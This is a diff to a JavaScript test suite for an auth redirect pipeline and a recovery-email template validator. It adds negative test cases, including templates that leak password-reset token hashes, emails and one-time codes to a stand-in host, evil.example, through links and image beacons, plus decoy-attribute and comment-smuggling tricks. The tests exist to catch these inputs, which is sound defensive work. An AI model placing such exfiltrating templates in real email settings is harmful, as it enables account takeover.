@@ -55,6 +55,15 @@ describe('repository Auth redirect contract', () => {
     expect(pipeline).not.toContain('Activate recovery token-hash template in preview');
     expect(productionDeploy).toBeGreaterThan(-1);
     expect(productionTemplate).toBeGreaterThan(productionDeploy);
+
+    const productionJob = pipeline.slice(pipeline.indexOf('  deploy-vercel:'));
+    const productionJobEnv = productionJob.slice(
+      productionJob.indexOf('    env:'),
+      productionJob.indexOf('\n\n    steps:'),
+    );
+    expect(productionJobEnv).not.toContain('SUPABASE_ACCESS_TOKEN');
+    expect(productionJob.match(/SUPABASE_ACCESS_TOKEN: \$\{\{ secrets\.SUPABASE_ACCESS_TOKEN \}\}/g))
+      .toHaveLength(2);
   });
 });
 
@@ -69,6 +78,29 @@ describe('recovery email template contract', () => {
     )).toBe(false);
     expect(isSafeRecoveryTemplate('<a href="{{ .SiteURL }}/auth/callback">reset</a>')).toBe(false);
     expect(isSafeRecoveryTemplate('<a href="https://iconsip.com/auth/callback">reset</a>')).toBe(false);
+    expect(isSafeRecoveryTemplate(
+      '<p>{{ .RedirectTo }}</p><a href="https://evil.example/reset?token_hash={{ .TokenHash }}&type=recovery">reset</a>',
+    )).toBe(false);
+    expect(isSafeRecoveryTemplate(
+      '<a href="{{ .RedirectTo }}?token_hash={{ .TokenHash }}&type=recovery">reset</a>'
+      + '<img src="https://evil.example/collect?token_hash={{ .TokenHash }}">',
+    )).toBe(false);
+    expect(isSafeRecoveryTemplate(
+      '<a href="{{ .redirectto }}?token_hash={{ .tokenhash }}&type=recovery">reset</a>',
+    )).toBe(false);
+    expect(isSafeRecoveryTemplate(
+      '<p data-href="{{ .RedirectTo }}?token_hash={{ .TokenHash }}&type=recovery">reset</p>',
+    )).toBe(false);
+    expect(isSafeRecoveryTemplate(
+      '<a title="decoy href=\'{{ .RedirectTo }}?token_hash={{ .TokenHash }}&type=recovery\'">reset</a>',
+    )).toBe(false);
+    expect(isSafeRecoveryTemplate(
+      '<a <!-- href="{{ .RedirectTo }}?token_hash={{ .TokenHash }}&type=recovery" -->>reset</a>',
+    )).toBe(false);
+    expect(isSafeRecoveryTemplate(
+      '<a href="{{ .RedirectTo }}?token_hash={{ .TokenHash }}&type=recovery">reset</a>'
+      + '<img src="https://evil.example/collect?email={{ .Email }}&otp={{ .Token }}">',
+    )).toBe(false);
   });
 });
 
